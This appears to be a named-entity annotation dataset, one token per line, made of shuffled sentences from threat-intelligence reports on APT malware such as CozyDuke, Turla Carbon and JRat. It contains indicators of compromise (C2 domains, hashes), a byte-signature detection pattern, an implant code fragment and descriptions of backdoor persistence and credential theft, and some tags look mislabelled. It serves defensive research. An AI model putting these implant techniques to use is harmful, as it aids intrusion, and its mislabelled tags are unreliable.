in	O
the	O
past	O
and	O
know	O
them	O
well	O
.	O

2016	O
,	O
4:12	O
PM	O
.	O

English	O

9318	O
-	O
HANARO-AS	O
Hanaro	O
Telecom	O
Inc	O
.	O

Our	O
industry-leading	O
expertise	O
in	O
protecting	O
data	O
,	O
identities	O
,	O
and	O
interactions	O
gives	O
our	O
customers	O
confidence	O
in	O
a	O
connected	O
world	O
.	O

68	O
6F	O
6E	O
00	O
00	O
68	O
75	O
72	O
6C	O
6D	O

Instead	O
,	O
it	O
is	O
the	O
Shellcode	O
with	O
backdoor	O
functionality	O
.	O

Then	O
,	O
deployment	O
of	O
the	O
installers	O
continued	O
mostly	O
within	O
Turkey	O
in	O
July	O
and	O
September	O
2016	O
.	O

start	O
:	O
]	O

The	O
Attacker	O
's	O
English	O
Level	O
The	O
typo	O
in	O
the	O
file	O
's	O
name	O
(	O
Interenet	B-malware.drop
Assistant	I-malware.drop
)	O
helped	O
us	O
find	O
another	O
executable	O
with	O
the	O
same	O
name	O
that	O
is	O
almost	O
identical	O
to	O
the	O
original	O
one	O
.	O

Cyberkov	O
Security	O
Incident	O
Response	O
Team	O
(	O
CSIRT	O
)	O
started	O
analyzing	O
the	O
APK	O
file	O
(	O
malware	O
)	O
and	O
the	O
first	O
step	O
was	O
to	O
unpack	O
it	O
.	O

Despite	O
these	O
facts	O
,	O
various	O
indicators	O
suggest	O
that	O
the	O
attack	O
had	O
a	O
low	O
level	O
of	O
sophistication	O
.	O

This	O
document	O
has	O
been	O
prepared	O
by	O
Cyberkov	O
Co	O
.	O

It	O
then	O
collects	O
autocomplete	O
entries	O
from	O
the	O
following	O
registry	O
key	O
:	O
It	O
then	O
initiates	O
a	O
brute	O
force	O
attack	O
on	O
encrypted	O
credentials	O
using	O
the	O
API	O
.	O

As	O
the	O
number	O
of	O
threats	O
per	O
day	O
continues	O
to	O
increase	O
,	O
the	O
number	O
of	O
malware	O
samples	O
security	O
companies	O
automatically	O
analyze	O
increases	O
.	O

Comic	O
break	O
:	O
The	O
certificate	O
is	O
protected	O
by	O
the	O
password	O
'	O
caonima123	O
'	O
,	O
which	O
means	O
'	O
f*ck	O
your	O
mom	O
'	O
in	O
Mandarin	O
.	O

The	O
target	O
file	O
is	O
loaded	O
using	O
the	O
LoadLibrary	O
API	O
function	O
,	O
and	O
the	O
address	O
of	O
the	O
exported	O
function	O

Mode	O
codes	O
are	O
used	O
to	O
determine	O
in	O
what	O
circumstances	O
the	O
actions	O
will	O
be	O
executed	O
and	O
to	O
respond	O
to	O
specifi	O
c	O
action	O
settings	O
accordingly	O
.	O

The	O
request	O
decodes	O
to	O
'	O
123	O
|	O
000000+	O
|	O
USER-D6921F6215	O
|	O
Administrator	O
|	O
-1676096002	O
|	O
1.0	O
|	O
0	O
|	O
'	O
,	O
where	O
values	O
are	O
separated	O
by	O
the	O
delimiter	O
'	O
|	O
'	O
.	O

The	O
main	O
module	O
is	O
then	O
downloaded	O
and	O
loaded	O
into	O
memory	O
using	O
Reflective	O
DLL	O
Injection	O
.	O

Once	O
found	O
,	O
the	O
payload	O
adds	O
the	O
address	O
for	O
the	O
specific	O
API	O
function	O
to	O
its	O
IAT	O
.	O

Figure	O
26	O
.	O

As	O
demonstrated	O
by	O
our	O
research	O
,	O
the	O
attackers	O
are	O
using	O
various	O
techniques	O
to	O
evade	O
detection	O
and	O
infect	O
unsuspecting	O
Portuguese-speaking	O
users	O
with	O
banking	O
Trojans	O
.	O

Finally	O
,	O
the	O
rest	O
of	O
the	O
file	O
will	O
be	O
the	O
actual	O
configuration	O
data	O
.	O

The	O
gathered	O
data	O
would	O
ostensibly	O
be	O
exfiltrated	O
via	O
other	O
means	O
.	O

Apart	O
from	O
the	O
different	O
design	O
,	O
functionally	O
the	O
main	O
component	O
is	O
very	O
similar	O
to	O
other	O
CozyDuke	B-malware.drop
main	O
components	O
.	O

Additional	O
domains	O
and	O
IP	O
addresses	O
related	O
to	O
this	O
group	O
are	O
included	O
in	O
the	O
appendix	O
.	O

10101	O
N	O
.	O

Russia	O
Russia	O
Br	O
az	O
il	O
Br	O
az	O
il	O
T	O
ur	O
ke	O
y	O
T	O
ur	O
ke	O
y	O
Ge	O
o	O
r	O
gia	O
Ge	O
o	O
r	O
gia	O
Kaz	O
akhst	O
an	O
Kaz	O
akhst	O
an	O

readFiles	O

This	O
suggests	O
that	O
the	O
same	O
espionage	O
group	O
involved	O
in	O
this	O
attack	O
also	O
targeted	O
the	O
senior	O
army	O
officers	O
using	O
a	O
different	O
email	O
theme	O
.	O

It	O
is	O
subject	O
to	O
change	O
.	O

Cryptography	O
ranges	O
from	O
built-in	O
windows	O
api	O
to	O
custom	O
RC4-based	O
ciphers	O
.	O

Control	O
flow	O
obfuscation	O

Acknowledgments	O

The	O
server-side	O
content	O
could	O
easily	O
be	O
overlooked	O
among	O
the	O
other	O
files	O
associated	O
with	O
a	O
vanilla	O
install	O
of	O
a	O
complex	O
application	O
.	O

Russian	O
text	O
in	O
dialog	O
box	O
:	O
'	O
внимание	O
!	O

FOR	O
UKRAINIAN	O
TROOPS	O
,	O
ARTILLERY	O
FORCES	O
HAVE	O
ALSO	O
SHOULDERED	O
A	O
HEAVY	O
COST	O
.	O

Init	O
(	O
)	O
;	O
if	O
(	O
!	O
IsUserValid	O
(	O
)	O
)	O
int.Parse	O
(	O
Request.Cookies	O
[	O
'	O
REDACTED	O
'	O
]	O
.Value	O
)	O
;	O
Page.Visible	O
=	O
true	O
;	O
catch	O
(	O
Exception	O
)	O
Page.Visible	O
=	O
false	O
;	O
Response.Clear	O
(	O
)	O
;	O
Response.End	O
(	O
)	O
;	O
else	O
Page.Visible	O
=	O
true	O
;	O
Response	O
.	O

Interestingly	O
,	O
the	O
ISPs	O
providing	O
internet	O
access	O
in	O
these	O
provinces	O
are	O
also	O
believed	O
to	O
maintain	O
lines	O
into	O
North	O
Korea	O
.	O

TEMP	O
.	O

Although	O
this	O
does	O
n't	O
necessarily	O
mean	O
that	O
the	O
binaries	O
were	O
created	O
on	O
the	O
same	O
development	O
computer	O
,	O
they	O
were	O
definitely	O
compiled	O
using	O
the	O
same	O
version	O
of	O
the	O
Microsoft	O
Visual	O
Studio	O
up	O
to	O
the	O
build	O
number	O
version	O
and	O
using	O
similar	O
project	O
configuration	O
.	O

Known	O
Cmstar	B-malware.unknown
Downloaders	O

Our	O
goal	O
was	O
to	O
determine	O
whether	O
any	O
of	O
these	O
institutes	O
had	O
forecasted	O
Iran	O
's	O
intentions	O
in	O
cyberspace	O
leading	O
up	O
to	O
the	O
U.S.	O
decision	O
to	O
withdraw	O
from	O
the	O
2015	O
JCPOA	O
.	O

Affected	O
Industry	O
Sectors	O

The	O
attackers	O
'	O
remarkable	O
ability	O
to	O
quickly	O
adapt	O
demonstrated	O
their	O
skill	O
and	O
familiarity	O
with	O
and	O
command	O
of	O
the	O
company	O
's	O
network	O
and	O
its	O
operations	O
.	O

Sound	O
data	O
logs	O
follow	O
the	O
format	O
'	O
A	O
|	O
%	O
u	O
|	O
%	O
S	O
'	O
,	O
document	O
logs	O
the	O
format	O
'	O
%	O
I64i	O
|	O
%	O
I64i	O
|	O
%	O
I64i	O
|	O
%	O
s	O
%	O
s	O
|	O
%	O
s\n	O
'	O
.	O

They	O
are	O
slightly	O
modified	O
.	O

Figure	O
4	O
Content	O
of	O
Sample	O
B	O

Based	O
on	O
logging	O
strings	O
,	O
variable	O
naming	O
and	O
PDB	O
strings	O
found	O
in	O
CozyDuke	B-malware.drop
samples	O
,	O
we	O
observed	O
the	O
following	O
:	O
•	O
The	O
internal	O
name	O
for	O
CozyDuke	B-malware.drop
is	O
'	O
Agent	O
'	O
•	O
The	O
CozyDuke	B-malware.drop
main	O
component	O
's	O
functionality	O
revolves	O
around	O
the	O
execution	O
of	O
'	O
tasks	O
'	O
that	O
are	O
often	O
associated	O
with	O
'	O
modules	O
'	O
It	O
is	O
possible	O
that	O
the	O
name	O
'	O
Agent	O
'	O
is	O
not	O
the	O
original	O
internal	O
name	O
of	O
CozyDuke	B-malware.drop
and	O
that	O
the	O
name	O
was	O
changed	O
sometime	O
in	O
2011	O
with	O
the	O
original	O
project	O
name	O
being	O
'	O
Agent_NextGen	O
'	O
•	O
Sometime	O
in	O
2011	O
,	O
CozyDuke	B-malware.drop
was	O
identified	O
internally	O
as	O
being	O
version	O
3	O
PDB	O
strings	O
found	O
in	O
early	O
CozyDuke	B-malware.drop
samples	O
are	O
listed	O
in	O
Table	O
4	O
(	O
below	O
)	O
.	O

2016	O
.	O

Both	O
attack	O
groups	O
employ	O
numerous	O
,	O
yet	O
common	O
techniques	O
in	O
an	O
attempt	O
to	O
evade	O
detection	O
by	O
various	O
sandbox	O
environments	O
,	O
antivirus	O
(	O
AV	O
)	O
software	O
,	O
and	O
gateway	O
firewalls	O
.	O

High	O

The	O
Following	O
Are	O
Hypothetical	O
Scenarios	O
Designed	O
to	O
Illustrate	O
Possible	O
Employment	O
Options	O
Possible	O
Commands	O
One	O
-­‐	O
Targeting	O
Specific	O
Devices	O
(	O
Known	O
to	O
Intruder	O
From	O
Previous	O
netsat/netui3	O
Activity	O
)	O
Command	O

Path	O
-­‐-­‐	O
>	O
%	O
s	O
to	O
Added	O
!	O

The	O
three	O
last	O
keys	O
are	O
displayed	O
with	O
obfuscated	O
names	O
(	O
'	O
xT0rvwz	O
'	O
,	O
'	O
tr4qa589	O
'	O
and	O
'	O
jopcft4T	O
'	O
)	O
and	O
store	O
parameters	O
for	O
the	O
custom	O
file	O
system	O
we	O
will	O
describe	O
later	O
.	O

Fig	O
11	O
.	O

GLANCE	O
UNDER	O
THE	O
HOOD	O
buffer	O
after	O
phase	O
one	O
XOR	O
:	O

The	O
attacks	O
against	O
China	O
specifically	O
targeted	O
government	O
,	O
scientific	O
research	O
institutions	O
and	O
some	O
particular	O
field	O
.	O

This	O
indicates	O
the	O
backdoor	O
can	O
also	O
function	O
as	O
a	O
plugin	O
for	O
the	O
Turla	O
Carbon	B-malware.backdoor
system	O
.	O

Created	O
by	O
'	O
Hitham	O
'	O
,	O
saved	O
by	O
'	O
anar	O
'	O
Created	O
by	O
'	O
Hitham	O
'	O
,	O
saved	O
by	O
'	O
Ayman	O
'	O
Created	O
and	O
saved	O
by	O
'	O
Tohan	O
'	O
date	O
Oct	O
12	O
th	O
2011	O
date	O
Nov	O
27	O
th	O
2011	O
date	O
Feb	O
18	O
th	O
2012	O

Most	O
of	O
the	O
times	O
the	O
perpetrators	O
remain	O
unknown	O
even	O
after	O
months	O
of	O
work	O
by	O
security	O
researchers	O
.	O

Like	O
the	O
'	O
upnphost.exe	B-malware.backdoor
'	O
malware	O
,	O
this	O
other	O
executable	O
periodically	O
contacts	O
the	O
command	O
and	O
control	O
waiting	O
for	O
new	O
commands	O
.	O

The	O
'	O
Windows	O
Device	O
Driver	O
(	O
Firewall	O
Hook	O
)	O
'	O
section	O
explains	O
the	O
functionality	O
of	O
the	O
driver	O
in	O
greater	O
detail	O
.	O

Metric	O

[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\recas.dat	O

A	O
fully	O
decrypted	O
file	O
is	O
then	O
parsed	O
as	O
a	O
PE	O
file	O
,	O
and	O
loaded	O
as	O
a	O
DLL	O
.	O

Itâ	O
€	O
TMs	O
unclear	O
if	O
this	O
code	O
is	O
activated	O
at	O
certain	O
times	O
or	O
if	O
there	O
is	O
a	O
whitelist	O
of	O
IPs	O
restricting	O
access	O
to	O
the	O
file	O
to	O
specific	O
targets	O
.	O

In	O
our	O
analysis	O
,	O
the	O
macro	O
is	O
obfuscated	O
,	O
character	O
by	O
character	O
,	O
using	O
the	O
decimal	O
ASCII	O
code	O
.	O

Network-lab.info	O
was	O
registered	O
by	O
Jack	O
Halawani	O
,	O
Beirut	O
,	O
Lebanon	O
,	O
jack.halawani@yandex.com	O
Over	O
the	O
last	O
two	O
years	O
,	O
SSH	O
logins	O
were	O
made	O
from	O
Lebanese	B-malware.unknown
ISPs	O
'	O
IP	O
ranges	O
.	O

Login/Domain	O
(	O
owner	O
)	O
:	O
Administrator/JOHN	O
(	O
john	O
)	O
Computer	O
name	O
:	O
JOHN	O
Organization	O
(	O
country	O
)	O
:	O
(	O
United	O
States	O
)	O
RecId	O
:	O
11173­01­PRS	O
MaxDelay	O
:	O
3600	O
Version	O
:	O
1.2	O
OS	O
version	O
(	O
SP	O
)	O
:	O
5.1	O
(	O
Service	O
Pack	O
3	O
)	O
WOW64	O
:	O
No	O
Default	O
browser	O
:	O
firefox.exe	O
IE	O
version	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
7.0	O
;	O
Win32	O
)	O
First	O
launch	O
:	O
04/01/2015	O
–	O
18:31:14	O
Time	O
to	O
kill	O
:	O
N/A	O
Last	O
launch	O
:	O
04/01/2015	O
–	O
19:21:44	O
Mode	O
:	O
N/A	O
|	O
Rights	O
:	O
Admin	O
|	O
UAC	O
:	O
No	O
ID	O
:	O
4635BEF0­D89D­11E4­B283­000C­29FD2872	O
InstallAv	O
:	O
0	O
Inj	O
:	O
Yes	O

Also	O
,	O
a	O
few	O
technical	O
artefacts	O
suggest	O
that	O
Dino	B-malware.backdoor
was	O
authored	O
by	O
native	O
French	O
speakers	O
.	O

The	O
cambio.xap	O
archive	O
sample	O
(	O
4cc10ab3f4ee6769e520694a10f611d5	O
)	O
does	O
not	O
use	O
eye-watch[.]in	B-url.cncsvr
as	O
a	O
C	O
&	O
C	O
channel	O
but	O
instead	O
was	O
downloaded	O
from	O
the	O
URL	O
:	O

//	O
10003640	O
$	O
=	O
{	O
80	O
[	O
2-7	O
]	O
2e	O
40	O
3d	O
50	O
02	O
00	O
00	O
72	O
?	O
?	O
}	O

This	O
pre-built	O
malware	O
has	O
all	O
the	O
functionality	O
needed	O
to	O
conduct	O
cyber	O
espionage	O
and	O
is	O
controlled	O
directly	O
by	O
humans	O
,	O
who	O
have	O
the	O
ability	O
to	O
adapt	O
to	O
network	O
defenses	O
.	O

Decoy	O
Document	O
Last	O
Modified	O
:	O

For	O
testing	O
purposes	O
the	O
system	O
with	O
Windows	O
2003	O
was	O
set	O
up	O
with	O
three	O
different	O
partitions	O
.	O

NOTE	O
:	O
For	O
clarity	O
,	O
the	O
length-checking	O
part	O
has	O
been	O
removed	O
from	O
the	O
snippet	O
.	O

Figure	O
6	O
It	O
has	O
modules	O
to	O
capture	O
system	O
information	O
(	O
processor	O
,	O
disk	O
,	O
memory	O
,	O
OS	O
)	O
,	O
process	O
id	O
,	O
process	O
start	O
time	O
,	O
and	O
current	O
user	O
information	O
.	O

The	O
string	O
found	O
in	O
the	O
file	O
C	O
:	O
\\Users\\Public\\Administrador\\car.dat	O
is	O
extracted	O
and	O
used	O
to	O
add	O
the	O
registry	O
key	O
Software\Microsoft\Windows\CurrentVersion\Run\	O
<	O
string	O
from	O
car.dat	O
>	O
for	O
persistence	O
,	O
as	O
shown	O
in	O
Figure	O
8	O
.	O

This	O
paper	O
seeks	O
to	O
highlight	O
this	O
campaign	O
targeting	O
significant	O
enterprises	O
worldwide	O
,	O
utilizing	O
a	O
Java-based	O
RAT	B-malware.backdoor
malware	O
that	O
is	O
currently	O
detected	O
by	O
a	O
small	O
set	O
of	O
security	O
tools	O
.	O

It	O
checks	O
the	O
response	O
from	O
the	O
controller	O
against	O
the	O
expected	O
value	O
and	O
returns	O
a	O
result	O
data	O
structure	O
indicating	O
success	O
or	O
a	O
False	O
object	O
representing	O
failure	O
.	O

Appendix	O
A	O
:	O
Snort	O
Rules	O

DBE2AC744A3947B6306E13EBCCB718BF	B-hash
lokia.mine.nu	B-url.cncsvr

(	O
b1f56a54309147b07dda54623fecbb89	O
)	O
to	O
'	O
.tmp	O
'	O
file	O
in	O
%	O
temp	O
%	O
,	O
executed	O
,	O
and	O
the	O
downloader	O
exits	O
.	O

8	O
A	O
decrypted	O
JRat	B-malware.backdoor
config	O
file	O

Create	O
an	O
archive	O
from	O
given	O
file	O
paths	O
Unpack	O
an	O
archive	O
to	O
a	O
given	O
location	O
Schedule	O
a	O
file	O
transfer	O
to	O
the	O
C	O
&	O
C	O
using	O
the	O
FMGR	O
module	O
Remove	O
the	O
next	O
file	O
transfer	O
scheduled	O
in	O
the	O
FMGR	O
module	O
Remove	O
all	O
scheduled	O
file	O
transfers	O
in	O
the	O
FMGR	O
module	O
Schedule	O
a	O
command	O
to	O
be	O
executed	O
at	O
a	O
certain	O
time	O
by	O
the	O
CRONTAB	O
module	O
(	O
see	O
CRONTAB	O
description	O
below	O
for	O
details	O
)	O
List	O
registered	O
entries	O
in	O
the	O
CRONTAB	O
module	O
Remove	O
an	O
entry	O
in	O
the	O
CRONTAB	O
module	O
Schedule	O
a	O
wake­up	O
of	O
the	O
malware	O
after	O
a	O
certain	O
amount	O
of	O
time	O
using	O
the	O
CRONTAB	O
module	O
N/A	O
:	O
the	O
command	O
is	O
actually	O
not	O
implemented	O
Display	O
the	O
public	O
IP	O
of	O
the	O
infected	O
machine	O
Display	O
information	O
about	O
the	O
currently	O
used	O
C	O
&	O
C	O
server	O
Display	O
information	O
about	O
all	O
known	O
C	O
&	O
C	O
servers	O
Download	O
a	O
file	O
from	O
the	O
currently	O
used	O
C	O
&	O
C	O
server	O
onto	O
the	O
machine	O
delayttk	O
Delay	O
the	O
de­installation	O
of	O
the	O
malware	O
,	O
if	O
scheduled	O
One	O
command	O
of	O
particular	O
interest	O
is	O
'	O
search	O
'	O
,	O
which	O
allows	O
the	O
operators	O
to	O
look	O
for	O
files	O
very	O
precisely	O
.	O

In	O
the	O
case	O
of	O
Wannacry	B-malware.unknown
,	O
Google	O
's	O
Neel	O
Mehta	O
was	O
able	O
to	O
identify	O
a	O
code	O
fragment	O
which	O
became	O
the	O
most	O
important	O
clue	O
in	O
the	O
story	O
,	O
and	O
was	O
later	O
confirmed	O
by	O
further	O
evidence	O
,	O
showing	O
Wannacry	B-malware.unknown
as	O
a	O
pet	O
project	O
of	O
the	O
Lazarus	O
group	O
.	O

THIS	O
APP	O
WAS	O
DEVELOPED	O
AND	O
USED	O
BY	O
ARTILLERY	O
TROOPS	O
TO	O
SIMPLIFY	O
TARGETING	O
DATA	O
FOR	O
THE	O
D-30	O
TOWED	O
HOWITZER	O

sl1.homelinux.org	B-url.unknown
360.homeunix.com	B-url.unknown
ftp2.homeunix.com	B-url.unknown
update.ourhobby.com	B-url.unknown
blog1.servebeer.com	B-url.unknown

For	O
instance	O
,	O
Russian	O
operators	O
,	O
such	O
as	O
Sandworm	O
Team	O
,	O
have	O
compromised	O
Western	O
ICS	O
over	O
a	O
multi-year	O
period	O
without	O
causing	O
a	O
disruption	O
.	O

The	O
most	O
common	O
ports	O
used	O
are	O
,	O
80	O
,	O
1985	O
,	O
1986	O
,	O
and	O
443	O
.	O

The	O
fi	O
rst	O
check-in	O
to	O
the	O
client	O
consists	O
of	O
a	O
login	O
token	O
(	O
TOKEN_LOGIN	O
)	O
that	O
is	O
followed	O
by	O
the	O
data	O
encapsulated	O
in	O
a	O
'	O
LOGINDATA	O
'	O
structure	O
.	O

Fidelis	O
XPS	O
TM	O
Advanced	O
Threat	O
Defense	O
solution	O
from	O
General	O
Dynamics	O
Fidelis	O
Cybersecurity	O
Solutions	O
detects	O
all	O
of	O
the	O
activity	O
documented	O
in	O
this	O
paper	O
.	O

In	O
all	O
cases	O
the	O
attackers	O
rely	O
on	O
social	O
engineering	O
-	O
convincing	O
the	O
victim	O
to	O
open	O
the	O
file	O
(	O
and	O
enabling	O
content	O
if	O
it	O
is	O
disabled	O
)	O
-	O
and	O
not	O
on	O
software	O
vulnerabilities	O
In	O
addition	O
to	O
DustySky	B-malware.drop
,	O
the	O
attackers	O
use	O
publicly	O
available	O
tools	O
such	O
as	O
the	O
following	O
Remote	B-malware.unknown
Administration	O
Tools	O
(	O
RAT	O
)	O
:	O
Poison	B-malware.unknown
ivy	I-malware.unknown
,	O
Nano	B-malware.unknown
Core	I-malware.unknown
,	O
XtremeRAT	B-malware.backdoor
,	O
DarkComet	B-malware.unknown
and	O
Spy-Net	B-malware.unknown
.	O

%	O
WINDOWS	O
%	O
\SoftwareDistribution\ReportingEvents.log.12	O
.	O

The	O
Powershell	O
backdoor	O
is	O
ingenious	O
in	O
its	O
simplicity	O
and	O
power	O
.	O

Figure	O
18	O
.	O

FIGURE	O
1	O
:	O
C	O
&	O
C	O
INFRASTRUCTURE	O
CONNECTIONS	O
BETWEEN	O
COZYDUKE	B-malware.drop
,	O
MINIDUKE	O
AND	O
ONIONDUKE	O
CozyDuke	B-malware.drop
MiniDuke	O
OnionDuke	O

The	O
backdoor	O
would	O
also	O
issue	O
anomalous	O
HTTP	O
requests	O
with	O
the	O
method	O
'	O
ST	O
'	O
in	O
the	O
event	O
that	O
the	O
C2	O
server	O
did	O
not	O
respond	O
appropriately	O
to	O
the	O
initial	O
request	O
.	O

winmeif.myq-see.com	B-url.unknown
using	O
the	O
port	O
64631	O

In	O
the	O
next	O
paragraphs	O
,	O
we	O
will	O
present	O
the	O
results	O
of	O
searching	O
for	O
samples	O
associated	O
with	O
these	O
APT	B-malware.unknown
campaigns	O
in	O
our	O
datasets	O
.	O

ICEBRG	O
was	O
the	O
first	O
to	O
report	O
the	O
discovered	O
vulnerability	O
to	O
Adobe	O
,	O
on	O
June	O
1	O
,	O
2018	O
at	O
4:14	O
AM	O
PDT	O
.	O

Hosting	O
mostly	O
was	O
provided	O
at	O
Fast	O
Serv	O
Inc	O
and	O
resellers	O
,	O
in	O
all	O
likelihood	O
related	O
to	O
bitcoin	O
payment	O
processing	O
.	O

Otherwise	O
,	O
it	O
starts	O
polling	O
the	O
remote	O
C	O
&	O
C	O
for	O
a	O
remote	O
task	O
to	O
execute	O
.	O

1	O
inetnum	O
:	O
200.63.40/21	O
2	O
status	O
:	O
allocated	O
3	O
aut	O
num	O
:	O
N/A	O
4	O
owner	O
:	O
Panamaserver.com	O
5	O
ownerid	O
:	O
PA	O
PANA2	O
LACNIC	O
6	O
responsible	O
:	O
Ch	O
Group	O
Corp.7	O
address	O
:	O
Bella	O
Vista	O
,	O
El	O
cangrejo	O
,	O
Calle	O
49	O
,	O
0	O
,	O
8	O
address	O
:	O
00000	O
Panama	O
9	O
country	O
:	O
PA	O
10	O
phone	O
:	O
+507	O
263	O
3723	O
[	O
]	O
11	O
owner	O
c	O
:	O
MAC30	O
12	O
tech	O
c	O
:	O
MAC30	O
13	O
abuse	O
c	O
:	O
MAC30	O
14	O
inetrev	O
:	O
200.63.46/24	O
15	O
nserver	O
:	O
NS1.PANAMASERVER.COM	O
16	O
nsstat	O
:	O
20130311	O
AA	O
17	O
nslastaa	O
:	O
20130311	O
18	O
created	O
:	O
20080328	O
19	O
changed	O
:	O
20080328	O
21	O
nic	O
hdl	O
:	O
MAC30	O
22	O
person	O
:	O
Manuel	O
I.Cabrera	O
Ch	O
.	O

jopcft4T	O
:	O
a.ini	O
WIDESTR	O
While	O
most	O
of	O
the	O
keys	O
have	O
self­explanatory	O
names	O
,	O
we	O
would	O
like	O
to	O
focus	O
on	O
the	O
following	O
keys	O
:	O
'	O
recID	O
'	O
:	O
Animal	O
Farms	O
binaries	O
contain	O
an	O
ID	O
whose	O
decimal	O
value	O
appears	O
to	O
identify	O
the	O
target	O
,	O
'	O
11173­01­	O
PRS	O
'	O
in	O
this	O
case	O
.	O

On	O
Monday	O
August	O
25	O
,	O
2014	O
we	O
observed	O
a	O
different	O
spear	O
phish	B-malware.infosteal
email	O
sent	O
from	O
lilywang823@gmail.com	O
to	O
a	O
technology	O
company	O
located	O
in	O
Taiwan	O
.	O

Operate	O
in	O
an	O
interactive	O
mode	O
to	O
allow	O
the	O
attacker	O
to	O
perform	O
additional	O
investigation	O
on	O
the	O
compromised	O
system	O
and	O
exfiltrate	O
data	O
.	O

However	O
,	O
8	O
out	O
of	O
54	O
AntiVirus	O
engines	O
detect	O
it	O
which	O
is	O
a	O
very	O
low	O
detection	O
rate	O
(	O
15	O
%	O
)	O
.	O

1	O
*	O
http://news.grouptumbler.com/news/feed.php	O
?	O

Defending	O
against	O
RATANKBA	B-malware.backdoor

e0aaa10bf812a17bb615637bf670c785bca34096	B-hash

Figure	O
5	O
-	O
The	O
patch	O
point	O
of	O
the	O
dropper	O

ZxShell.dll	B-malware.backdoor
is	O
injected	O
in	O
a	O
shared	O
SVCHOST	O
process	O
.	O

This	O
whitepaper	O
describes	O
our	O
journey	O
in	O
dissecting	O
the	O
backdoor	O
and	O
documenting	O
it	O
piece	O
by	O
piece	O
.	O

I	O
.	O

Application	O
whitelisting	O
–	O
Whitelisting	O
is	O
one	O
of	O
the	O
best	O
security	O
strategies	O
because	O
it	O
allows	O
only	O
specified	O
programs	O
to	O
run	O
while	O
blocking	O
all	O
others	O
,	O
including	O
malicious	O
software	O
.	O

INSTALL	O
EXTRACT	O
DELETE	O
EXEC	O
INJECT	O
SLEEP	O
KILL	O
AUTODEL	O

Linux	O

Exploit	O
:	O

The	O
check	O
code	O
is	O
calculated	O
through	O
using	O
process	O
ID	O
and	O
the	O
millisecond	O
process	O
during	O
system	O
startup	O
.	O

The	O
CozyDuke	B-malware.drop
toolset	O
Attack	O
overview	O
Infection	O
vector	O
Target	O
details	O
Timeline	O
Attribution	O
&	O
links	O

And	O
,	O
in	O
these	O
cases	O
,	O
the	O
attackers	O
did	O
not	O
re-use	O
their	O
fake	O
digital	O
certificates	O
.	O

path1	O
path2	O
path3	O
path4	O
https://marina-info.netGET	B-url.unknown
/find/	O
?	O
itwm=QAmXUXFS1aBuXMD4VCMCDg9RQWovPrCA2ag==	O
&	O
btnG=44NK	O
&	O
utm=	O
olrlGjBnc	O
&	O
aq=e5f1l6bFE1ef	O
&	O
N-Fl8=321vSxDE7MWll	O
POST	O
/open/	O
?	O
btnG=zoHM	O
&	O
btnG=RZ	O
&	O
utm=Ezm2RitD	O
&	O
aq=U	O
&	O
itwm=040sLB2hPVAXDiAILXHi_	O
nYDoZpWbFBwoPg==	O
&	O
oprnd=r0	O
&	O
Mxi3=SVfy	O
GET	O
/results/	O
?	O
utm=1V_	O
&	O
oprnd=FTLm7-D	O
&	O
aq=mlKH2SmjAwZjy	O
&	O
itwm=rNOn-HdIWmsWfPczLAM1xXdxdqFXHodLoYg==	O
GET	O
/watch/	O
?	O
itwm=BciqsllH-FDRVo0I6ylP_rBbDJqQNP1wZqA==	O
&	O
from=G	O
&	O
utm=JJ_N	O
&	O
oe=a	O
&	O
from=QdbP	O
&	O
TFWn0=dDViXhemoD6	O

This	O
cursory	O
analysis	O
disclosed	O
no	O
network	O
artifacts	O
specific	O
to	O
the	O
malware	O
's	O
operation	O
.	O

The	O
tool	O
was	O
custom	O
made	O
for	O
this	O
job	O
,	O
and	O
shows	O
a	O
significant	O
level	O
of	O
knowledge	O
of	O
SWIFT	O
Alliance	O
Access	O
software	O
as	O
well	O
as	O
good	O
malware	O
coding	O
skills	O
.	O

The	O
above	O
file	O
is	O
also	O
a	O
copy	O
of	O
one	O
of	O
the	O
malicious	O
components	O
.	O

–	O
pointer	O
to	O
stack	O
buffer	O
address	O
–	O
pointer	O
to	O
encoded	O
string	O
–	O
call	O
to	O
decode_string	O
As	O
the	O
instructions	O
above	O
will	O
decode	O
the	O
encoded	O
string	O
for	O
us	O
,	O
we	O
can	O
use	O
Windbg	O
to	O
run	O
our	O
code	O
.	O

Instead	O
the	O
website	O
appears	O
to	O
have	O
malicious	O
iFrames	O
leveraging	O
the	O
Chinese	O
URL	O
shortener	O
985.so	O
.	O

The	O
rules	O
are	O
on	O
the	O
first	O
8	O
bytes	O
of	O
the	O
first	O
two	O
packets	O
.	O

Kill	O
:	O

Agent.RUI	O

The	O
format	O
of	O
the	O
header	O
is	O
as	O
follows	O
:	O

Figure	O
11	O
.	O

The	O
attacker	O
is	O
unknown	O
at	O
this	O
point	O
,	O
but	O
the	O
purpose	O
is	O
assumed	O
to	O
be	O
espionage/surveillance	O
.	O

Beyond	O
Korean-speaking	O
HWP	O
users	O
,	O
targets	O
of	O
this	O
campaign	O
appear	O
to	O
be	O
users	O
of	O
the	O
Coinlink	O
cryptocurrency	O
exchange	O
,	O
South	O
Korean	O
cryptocurrency	O
exchanges	O
at	O
large	O
(	O
or	O
at	O
least	O
those	O
that	O
are	O
hiring	O
)	O
,	O
and	O
a	O
group	O
called	O
'	O
Friends	O
of	O
MOFA	O
'	O
(	O
Ministry	O
of	O
Foreign	O
Affairs	O
)	O
,	O
which	O
is	O
a	O
group	O
of	O
college	O
students	O
from	O
around	O
South	O
Korea	O
with	O
'	O
a	O
keen	O
interest	O
in	O
foreign	O
affairs	O
.	O
'	O

Figure	O
1	O
Figure	O
2	O
Figure	O
3	O
Figure	O
4	O
Figure	O
5	O
Figure	O
6	O
Figure	O
7	O
Figure	O
8	O
Figure	O
9	O
Figure	O
10	O
Figure	O
11	O

It	O
is	O
a	O
proxy-aware	O
,	O
fully-featured	O
backdoor	O
programmed	O
in	O
C++	O
and	O
compiled	O
using	O
Visual	O
Studio	O
2015	O
.	O

Despite	O
the	O
fact	O
that	O
it	O
does	O
n't	O
implement	O
any	O
particular	O
fancy	O
or	O
new	O
technique	O
,	O
the	O
code	O
quality	O
appears	O
to	O
be	O
clean	O
and	O
robust	O
,	O
making	O
rich	O
use	O
of	O
C	O
structures	O
and	O
logging	O
and	O
it	O
shows	O
on	O
some	O
places	O
that	O
it	O
is	O
targeting	O
organizational	O
infrastructures	O
rather	O
than	O
home	O
users	O
.	O

The	O
group	O
,	O
almost	O
certainly	O
compromised	O
of	O
a	O
sophisticated	O
and	O
prolific	O
set	O
of	O
developers	O
and	O
operators	O
,	O
has	O
historically	O
collected	O
intelligence	O
